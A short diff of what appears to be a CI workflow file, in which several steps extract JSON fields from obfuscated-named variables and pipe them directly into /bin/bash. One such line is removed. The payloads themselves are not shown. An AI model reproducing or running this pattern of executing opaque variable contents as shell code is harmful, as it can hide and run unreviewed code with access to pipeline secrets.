@@ -41,7 +41,6 @@ jobs:
           echo $p553 | jq -r .ziexi941 | /bin/bash
           printf '%s' "$dul26" | jq -r .u64 | /bin/bash
           echo $v5 | jq -r .vrm1 | /bin/bash
-          printf '%s' "$tbreu728" | jq -r .dpa3196 | /bin/bash
 
       - name: Save output
         if: always()
